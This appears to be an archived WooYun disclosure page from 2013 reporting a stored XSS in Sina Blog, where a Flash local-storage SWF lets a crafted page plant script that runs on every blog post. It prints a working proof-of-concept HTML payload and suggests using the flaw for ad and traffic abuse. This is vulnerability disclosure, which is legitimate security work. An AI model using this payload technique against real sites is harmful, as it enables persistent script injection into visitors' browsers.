@@ -1,0 +1,269 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪博客存储型XSS（全部博客可留后门）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪博客存储型XSS（全部博客可留后门）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/多多关照">多多关照</a> 
+</li><li>提交时间：		2013-11-14 17:09</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-14：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-04：	细节向普通白帽子公开<br/>
+									2013-12-14：	细节向实习白帽子公开<br/>
+									2013-12-29：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">不多说。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 任意打开新浪博客一个博文页面，例如：http://blog.sina.com.cn/s/blog_d38c52360101nhu0.html<br />
+<br />
+<br />
+<br />
+2. 页面都会加载 http://d1.sina.com.cn/litong/zhitou/identity.html<br />
+<br />
+<br />
+<br />
+3. identity.html页面会调用 http://d1.sina.com.cn/litong/zhitou/storage.swf，并且会调用以下代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>var fs = me.getFlashStorage({key:&quot;SinaAdFlashKey&quot;});</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4. 反编译 http://d1.sina.com.cn/litong/zhitou/storage.swf ，可见以下代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>ExternalInterface.addCallback(&quot;saveBaseCookie&quot;, saveBaseCookie);<br />
+ExternalInterface.addCallback(&quot;getBaseCookie&quot;, getBaseCookie);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+5. 基于以上信息，可以得知满足  <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-039481">WooYun: 一个flash的0day导致的淘宝网存储xss(可形成永久后门)</a>  中所描述的利用条件。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">测试仅chrome下进行。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+<br />
+&lt;body&gt;<br />
+<br />
+&lt;object id=&quot;JSocket&quot; tabindex=&quot;-1&quot; classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; width=&quot;1&quot; height=&quot;1&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab&quot;&gt;<br />
+<br />
+       &lt;param name=&quot;movie&quot; value=&quot;http://d1.sina.com.cn/litong/zhitou/storage.swf&quot;&gt;<br />
+<br />
+       &lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;<br />
+<br />
+       &lt;embed name=&quot;JSocket&quot; src=&quot;http://d1.sina.com.cn/litong/zhitou/storage.swf&quot; width=&quot;1&quot; height=&quot;1&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.adobe.com/go/getflashplayer&quot;&gt;<br />
+<br />
+&lt;/object&gt;<br />
+<br />
+&lt;script&gt;<br />
+<br />
+function set(){document[&#039;JSocket&#039;].saveBaseCookie(&#039;SinaAdFlashKey&#039;,&#039;aa\\&quot;;alert(document.domain);1;//aa&#039;);}<br />
+<br />
+setTimeout(&quot;set()&quot;,5000);<br />
+<br />
+&lt;/script&gt;<br />
+<br />
+&lt;/body&gt;<br />
+<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+由于identity.html中有以下代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>var fs = me.getFlashStorage({key:&quot;SinaAdFlashKey&quot;});<br />
+            if(fs){<br />
+<br />
+            }else{<br />
+                fs = gc;<br />
+                me.setFlashStorage({key:&quot;SinaAdFlashKey&quot;,value:gc});<br />
+            }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+利用代码中的 alert(document.domain);1; 中的 1 作为 getBaseCookie(&#039;SinaAdFlashKey&#039;);函数的返回值，以免 identity.html 中的代码流程覆盖了我们存储在LSO的恶意代码。<br />
+<br />
+<br />
+<br />
+---------------------------<br />
+<br />
+<br />
+<br />
+新浪博客的用户，在直接或者间接的访问到我们恶意构造的页面后，例如http://itsokla.duapp.com/sinablogxss1.htm，<br />
+<br />
+<br />
+<br />
+再访问 新浪的任意博文，都会触发此XSS。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/14170455876b880cc9610460de4001ac7fa22060.jpg" target="_blank"><img src="../images/14170455876b880cc9610460de4001ac7fa22060.jpg" alt="QQ图片20131114170428.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"><br />
+<br />
+这个XSS本身可能很难对用户自身信息造成大的危害。<br />
+<br />
+<br />
+<br />
+不过用来挂广告刷流量之类的，应该还是挺不错的：<br />
+<br />
+1. 恶意代码并非存储在页面之中，隐蔽性极强。<br />
+<br />
+2. 作用范围广，全部博文都会触发。<br />
+<br />
+<br />
+<br />
+修复方法：<br />
+<br />
+<br />
+<br />
+数据在存入LSO之前，将 \ 过滤。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/多多关照" title="多多关照">多多关照</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-042916" title="新浪博客存储型XSS（全部博客可留后门）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：11 </p>
+													<p class="detail">确认时间：2013-11-14 17:31</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注新浪安全，该问题已经确认，马上安排相关人员修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="42916";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
